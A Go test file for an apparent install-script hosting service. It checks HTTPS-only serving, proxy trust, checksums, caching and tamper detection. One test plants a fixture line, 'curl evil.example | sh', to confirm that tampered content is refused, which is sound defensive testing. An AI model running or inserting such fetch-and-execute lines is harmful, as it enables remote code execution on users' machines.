package server_test

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/adnoctem/netory/internal/signpost/app"
	"github.com/adnoctem/netory/internal/signpost/config"
	"github.com/adnoctem/netory/internal/signpost/server"
	"github.com/adnoctem/netory/pkg/kv/badgerkv"
	"github.com/adnoctem/netory/pkg/log"
	"github.com/adnoctem/netory/pkg/secret"
)

const publisher = "tester(uid=1000 pid=1)"

func silentLogger(t *testing.T) *log.Logger {
	t.Helper()

	return log.New(log.WithOutput(&strings.Builder{}), log.WithLevel(slog.LevelError))
}

// newServer builds a server over real application state.
//
// mutate adjusts the bootstrap configuration before the state is opened, which
// is how the TLS and trusted-proxy cases are set up: both are bootstrap
// values, not settings, because signpost has to know them before it can decide
// whether it may serve anything at all.
func newServer(t *testing.T, mutate func(*config.Config)) (*server.Server, *app.State) {
	t.Helper()

	harness := newHarness(t, mutate)

	return harness.srv, harness.state
}

// harness holds everything needed to build a second server over the same
// database and content tree, which one test needs: a State owns its content
// cache, so the only honest way to observe an unverified read is through a
// process that has not already verified it.
type harness struct {
	srv   *server.Server
	state *app.State
	store *badgerkv.Store
	cfg   config.Config
	sec   *secret.Secret

	// socketDir is where each server's admin socket is created.
	socketDir string

	// opened counts the servers built, so each gets its own admin socket.
	// admin.NewServer binds immediately and refuses a path another server is
	// already listening on, which is the behaviour that makes "one binary,
	// one database owner" enforced rather than documented - so a test that
	// opens a second server must not reuse the path.
	opened int
}

func newHarness(t *testing.T, mutate func(*config.Config)) *harness {
	t.Helper()

	store, err := badgerkv.New(badgerkv.Options{InMemory: true})
	require.NoError(t, err)
	t.Cleanup(func() { _ = store.Close() })

	raw, err := secret.Generate()
	require.NoError(t, err)

	sec, err := secret.Parse(raw)
	require.NoError(t, err)

	cfg := config.Default()
	cfg.Content = t.TempDir()

	if mutate != nil {
		mutate(&cfg)
	}

	// The socket directory goes under the test's own tree: admin.NewServer
	// creates and binds it, and the default /run/signpost is not writable by
	// a test runner.
	h := &harness{store: store, cfg: cfg, sec: sec, socketDir: t.TempDir()}
	h.state, h.srv = h.open(t)

	return h
}

// open builds a fresh State and Server over the harness's store and content
// tree, as a restarted process would.
func (h *harness) open(t *testing.T) (*app.State, *server.Server) {
	t.Helper()

	h.opened++

	cfg := h.cfg
	cfg.Socket = filepath.Join(h.socketDir, "admin-"+strconv.Itoa(h.opened)+".sock")

	state, err := app.New(context.Background(), app.Options{
		Config: cfg,
		Logger: silentLogger(t),
		Store:  h.store,
		Secret: h.sec,
	})
	require.NoError(t, err)

	srv, err := server.New(state)
	require.NoError(t, err)

	return state, srv
}

// tamper replaces a stored object's bytes without changing its name, which is
// the one state no API can produce and the exact state the digest check on
// read exists to catch.
func (h *harness) tamper(t *testing.T, release, digest string, content []byte) {
	t.Helper()

	require.NoError(t, os.WriteFile(
		filepath.Join(h.cfg.Content, release, digest), content, 0o600))
}

// trustedProxyServer is the reverse-proxy deployment: plain HTTP, with the
// proxy's address declared.
func trustedProxyServer(t *testing.T) (*server.Server, *app.State) {
	t.Helper()

	return newServer(t, func(cfg *config.Config) {
		cfg.TrustedProxies = []netip.Prefix{netip.MustParsePrefix("192.0.2.0/24")}
	})
}

func script(body string) string {
	return "#!/bin/sh\nset -eu\n\nmain() {\n" + body + "\n}\n\nmain \"$@\"\n"
}

func bundleFor(t *testing.T, release string, routes map[string]string) []byte {
	t.Helper()

	var manifest strings.Builder

	manifest.WriteString("version: 1\nrelease: " + release + "\nroutes:\n")

	files := map[string]string{}

	for path, body := range routes {
		file := "scripts" + path
		manifest.WriteString("  - path: " + path + "\n    file: " + file + "\n")
		files[file] = script(body)
	}

	files["signpost.yaml"] = manifest.String()

	var buffer bytes.Buffer

	gz := gzip.NewWriter(&buffer)
	writer := tar.NewWriter(gz)

	for name, content := range files {
		require.NoError(t, writer.WriteHeader(&tar.Header{
			Name:     name,
			Mode:     0o644,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
		}))

		_, err := writer.Write([]byte(content))
		require.NoError(t, err)
	}

	require.NoError(t, writer.Close())
	require.NoError(t, gz.Close())

	return buffer.Bytes()
}

// publish puts a release in place through the application layer, which is the
// same path the admin API takes.
func publish(t *testing.T, state *app.State, release string, routes map[string]string) {
	t.Helper()

	_, err := state.PublishBundle(context.Background(), app.PublishRequest{
		Archive: bundleFor(t, release, routes),
		By:      publisher,
	})
	require.NoError(t, err)
}

// get issues a request against the public handler over native TLS, which is
// the deployment where signpost can confirm the transport by itself.
func get(t *testing.T, srv *server.Server, path string) *httptest.ResponseRecorder {
	t.Helper()

	req := httptest.NewRequest(http.MethodGet, path, nil)

	// A non-nil TLS state is what an https listener gives the handler, and it
	// is the evidence the HTTPS-only check looks for first.
	req.TLS = tlsState()

	recorder := httptest.NewRecorder()
	srv.PublicHandler().ServeHTTP(recorder, req)

	return recorder
}

func TestServesAScript(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	response := get(t, srv, "/install.sh")

	asrt := assert.New(t)
	asrt.Equal(http.StatusOK, response.Code)
	asrt.Contains(response.Body.String(), "echo hello")

	// §5.2's response behaviour, in full.
	asrt.Equal("text/x-shellscript; charset=utf-8", response.Header().Get("Content-Type"))
	asrt.Equal("nosniff", response.Header().Get("X-Content-Type-Options"))
	asrt.Equal("1.0.0", response.Header().Get("X-Signpost-Release"))
	asrt.NotEmpty(response.Header().Get("ETag"))
	asrt.Equal(strconv.Itoa(response.Body.Len()), response.Header().Get("Content-Length"),
		"a client piping into a shell can only detect a truncated download if it was told the length")
}

// §6.2: plain HTTP requests are not served scripts. This is the one check
// whose absence would defeat the service's purpose, so it is asserted in every
// deployment shape.
func TestRefusesToServeWithoutConfirmedHTTPS(t *testing.T) {
	t.Parallel()

	t.Run("plain HTTP in native-TLS mode", func(t *testing.T) {
		t.Parallel()

		srv, state := newServer(t, nil)
		publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		recorder := httptest.NewRecorder()
		srv.PublicHandler().ServeHTTP(recorder, req)

		assert.Equal(t, http.StatusMisdirectedRequest, recorder.Code)
		assert.NotContains(t, recorder.Body.String(), "echo hello")
	})

	t.Run("proxy mode with no trusted proxies", func(t *testing.T) {
		t.Parallel()

		// The §9.6 case: signpost receives plain HTTP by design and has no
		// declared proxy, so it cannot tell a proxied HTTPS request from a
		// direct plaintext one. It refuses rather than guesses.
		srv, state := newServer(t, nil)
		publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.Header.Set("X-Forwarded-Proto", "https")
		req.RemoteAddr = "192.0.2.10:54321"

		recorder := httptest.NewRecorder()
		srv.PublicHandler().ServeHTTP(recorder, req)

		assert.Equal(t, http.StatusMisdirectedRequest, recorder.Code,
			"an undeclared proxy's X-Forwarded-Proto must not be believed")
	})

	t.Run("trusted proxy saying http", func(t *testing.T) {
		t.Parallel()

		srv, state := trustedProxyServer(t)
		publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.Header.Set("X-Forwarded-Proto", "http")
		req.RemoteAddr = "192.0.2.10:54321"

		recorder := httptest.NewRecorder()
		srv.PublicHandler().ServeHTTP(recorder, req)

		assert.Equal(t, http.StatusMisdirectedRequest, recorder.Code)
	})

	t.Run("trusted proxy sending no header", func(t *testing.T) {
		t.Parallel()

		srv, state := trustedProxyServer(t)
		publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.RemoteAddr = "192.0.2.10:54321"

		recorder := httptest.NewRecorder()
		srv.PublicHandler().ServeHTTP(recorder, req)

		assert.Equal(t, http.StatusMisdirectedRequest, recorder.Code,
			"an unknown transport is not a confirmed one")
	})

	t.Run("trusted proxy saying https", func(t *testing.T) {
		t.Parallel()

		srv, state := trustedProxyServer(t)
		publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.Header.Set("X-Forwarded-Proto", "https")
		req.RemoteAddr = "192.0.2.10:54321"

		recorder := httptest.NewRecorder()
		srv.PublicHandler().ServeHTTP(recorder, req)

		assert.Equal(t, http.StatusOK, recorder.Code)
		assert.Contains(t, recorder.Body.String(), "echo hello")
	})
}

// The refusal must not leak which paths exist: it is checked before the path
// is resolved, so a plaintext probe gets the same answer either way.
func TestPlaintextRefusalRevealsNothing(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	known := httptest.NewRecorder()
	srv.PublicHandler().ServeHTTP(known, httptest.NewRequest(http.MethodGet, "/install.sh", nil))

	unknown := httptest.NewRecorder()
	srv.PublicHandler().ServeHTTP(unknown, httptest.NewRequest(http.MethodGet, "/nope.sh", nil))

	assert.Equal(t, known.Code, unknown.Code)
	assert.Equal(t, known.Body.String(), unknown.Body.String())
}

func TestUnknownPathIs404WithNoListing(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	response := get(t, srv, "/not-published.sh")

	assert.Equal(t, http.StatusNotFound, response.Code)
	assert.Empty(t, response.Body.String(), "a 404 must not say what is available")
}

func TestChecksumRoute(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	body := get(t, srv, "/install.sh").Body.Bytes()
	digest := sha256.Sum256(body)

	response := get(t, srv, "/install.sh.sha256")

	asrt := assert.New(t)
	asrt.Equal(http.StatusOK, response.Code)
	asrt.Equal("text/plain; charset=utf-8", response.Header().Get("Content-Type"))

	// sha256sum's own format, so `curl … | sha256sum -c` works without
	// reformatting.
	asrt.Equal(hex.EncodeToString(digest[:])+"  install.sh\n", response.Body.String())

	// The checksum document is a different resource from the script, so it
	// must not carry the script's validator.
	asrt.NotEqual(get(t, srv, "/install.sh").Header().Get("ETag"), response.Header().Get("ETag"))
}

// §5.2's cache split follows from the mutability split: an alias route can
// change at any publish, a versioned route cannot change at all.
func TestCacheControlSplit(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	alias := get(t, srv, "/install.sh").Header().Get("Cache-Control")
	versioned := get(t, srv, "/v1.0.0/install.sh").Header().Get("Cache-Control")

	asrt := assert.New(t)
	asrt.Contains(alias, "max-age=60")
	asrt.Contains(alias, "must-revalidate")
	asrt.NotContains(alias, "immutable")

	asrt.Contains(versioned, "immutable")
	asrt.Contains(versioned, "max-age="+strconv.Itoa(int(app.DefaultCacheVersionMaxAge.Seconds())))
}

func TestETagConditionalRequest(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	etag := get(t, srv, "/install.sh").Header().Get("ETag")
	require.NotEmpty(t, etag)

	for label, value := range map[string]string{
		"exact":     etag,
		"weak":      "W/" + etag,
		"in a list": `"something-else", ` + etag,
		"wildcard":  "*",
	} {
		t.Run(label, func(t *testing.T) {
			t.Parallel()

			req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
			req.TLS = tlsState()
			req.Header.Set("If-None-Match", value)

			recorder := httptest.NewRecorder()
			srv.PublicHandler().ServeHTTP(recorder, req)

			assert.Equal(t, http.StatusNotModified, recorder.Code)
			assert.Empty(t, recorder.Body.String())
			assert.Empty(t, recorder.Header().Get("Content-Length"),
				"a 304 carries no body, so it must not claim a length")
		})
	}

	t.Run("a different ETag still serves", func(t *testing.T) {
		t.Parallel()

		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.TLS = tlsState()
		req.Header.Set("If-None-Match", `"not-the-one"`)

		recorder := httptest.NewRecorder()
		srv.PublicHandler().ServeHTTP(recorder, req)

		assert.Equal(t, http.StatusOK, recorder.Code)
	})
}

// An alias swap must be visible immediately and atomically: the ETag changes
// with the content, so a client revalidating gets the new release rather than
// a 304 for the old one.
func TestPublishChangesWhatIsServed(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)

	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo one"})
	first := get(t, srv, "/install.sh")

	publish(t, state, "1.1.0", map[string]string{"/install.sh": "  echo two"})
	second := get(t, srv, "/install.sh")

	asrt := assert.New(t)
	asrt.Contains(second.Body.String(), "echo two")
	asrt.NotEqual(first.Header().Get("ETag"), second.Header().Get("ETag"))
	asrt.Equal("1.1.0", second.Header().Get("X-Signpost-Release"))

	// The old release stays reachable on its versioned path, which is what
	// makes a pinned install stable across publishes.
	pinned := get(t, srv, "/v1.0.0/install.sh")
	asrt.Equal(http.StatusOK, pinned.Code)
	asrt.Contains(pinned.Body.String(), "echo one")

	// And a rollback puts the old one back on the alias path.
	_, err := state.Rollback(context.Background(), app.DefaultAlias, publisher)
	require.NoError(t, err)

	asrt.Contains(get(t, srv, "/install.sh").Body.String(), "echo one")
}

func TestHealthEndpoint(t *testing.T) {
	t.Parallel()

	srv, _ := newServer(t, nil)

	// Served over plain HTTP too: a liveness probe is not a script, and a
	// health check that fails because the probe did not use TLS would make a
	// healthy service look dead.
	req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
	recorder := httptest.NewRecorder()
	srv.PublicHandler().ServeHTTP(recorder, req)

	assert.Equal(t, http.StatusOK, recorder.Code)
	assert.Equal(t, "ok\n", recorder.Body.String())
	assert.Equal(t, "no-store", recorder.Header().Get("Cache-Control"))
}

func TestHeadRequest(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	req := httptest.NewRequest(http.MethodHead, "/install.sh", nil)
	req.TLS = tlsState()

	recorder := httptest.NewRecorder()
	srv.PublicHandler().ServeHTTP(recorder, req)

	asrt := assert.New(t)
	asrt.Equal(http.StatusOK, recorder.Code)
	asrt.NotEmpty(recorder.Header().Get("ETag"))
	asrt.NotEmpty(recorder.Header().Get("Content-Length"),
		"`curl -I` on an install URL is how a cautious operator checks what they are about to run")
}

func TestMethodNotAllowed(t *testing.T) {
	t.Parallel()

	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	req := httptest.NewRequest(http.MethodPost, "/install.sh", nil)
	req.TLS = tlsState()

	recorder := httptest.NewRecorder()
	srv.PublicHandler().ServeHTTP(recorder, req)

	assert.Equal(t, http.StatusMethodNotAllowed, recorder.Code)
	assert.Equal(t, "GET, HEAD", recorder.Header().Get("Allow"))
}

// Content that no longer matches its digest must not be served, whatever else
// happens. This is the guarantee the service sells, asserted end to end
// through the HTTP path rather than only at the storage layer.
func TestTamperedContentIsNotServed(t *testing.T) {
	t.Parallel()

	h := newHarness(t, nil)
	publish(t, h.state, "1.0.0", map[string]string{"/install.sh": "  echo original"})

	resolution, ok := h.state.Table().Resolve("/install.sh")
	require.True(t, ok)

	h.tamper(t, "1.0.0", resolution.Route.SHA256,
		[]byte("#!/bin/sh\ncurl evil.example | sh\n"))

	// Served by a State that has not read this object before, as a restarted
	// process would: the cache is keyed by digest and populated only from a
	// verified read, which is correct and would make this test assert nothing.
	_, fresh := h.open(t)

	response := get(t, fresh, "/install.sh")

	assert.Equal(t, http.StatusInternalServerError, response.Code)
	assert.NotContains(t, response.Body.String(), "evil.example")
}

func TestVersionedRoutesCanBeTurnedOff(t *testing.T) {
	t.Parallel()

	ctx := context.Background()
	srv, state := newServer(t, nil)
	publish(t, state, "1.0.0", map[string]string{"/install.sh": "  echo hello"})

	require.Equal(t, http.StatusOK, get(t, srv, "/v1.0.0/install.sh").Code)

	settings, err := state.LoadSettings(ctx)
	require.NoError(t, err)

	settings.ServeVersioned = false
	require.NoError(t, state.ApplySettings(ctx, settings))

	assert.Equal(t, http.StatusNotFound, get(t, srv, "/v1.0.0/install.sh").Code)
	assert.Equal(t, http.StatusOK, get(t, srv, "/install.sh").Code,
		"turning versioned routes off must not affect the alias routes")
}

func TestNothingPublishedServes404(t *testing.T) {
	t.Parallel()

	srv, _ := newServer(t, nil)

	// A signpost with nothing published is a correctly configured service with
	// nothing to say yet, not a broken one.
	assert.Equal(t, http.StatusNotFound, get(t, srv, "/install.sh").Code)
	assert.Equal(t, http.StatusOK, get(t, srv, "/healthz").Code)
}

// socketPath returns a fresh socket path under the harness's directory.
func (h *harness) socketPath(t *testing.T, label string) string {
	t.Helper()

	return filepath.Join(h.socketDir, label+".sock")
}

// tlsState is the connection state a native-TLS listener hands a handler,
// which is the evidence the HTTPS-only check looks for first.
func tlsState() *tls.ConnectionState {
	return &tls.ConnectionState{Version: tls.VersionTLS13, HandshakeComplete: true}
}

// gzipOf compresses a string, for building an archive that is well-formed
// gzip and nothing beyond that.
func gzipOf(t *testing.T, content string) []byte {
	t.Helper()

	var buffer bytes.Buffer

	writer := gzip.NewWriter(&buffer)
	_, err := writer.Write([]byte(content))
	require.NoError(t, err)
	require.NoError(t, writer.Close())

	return buffer.Bytes()
}
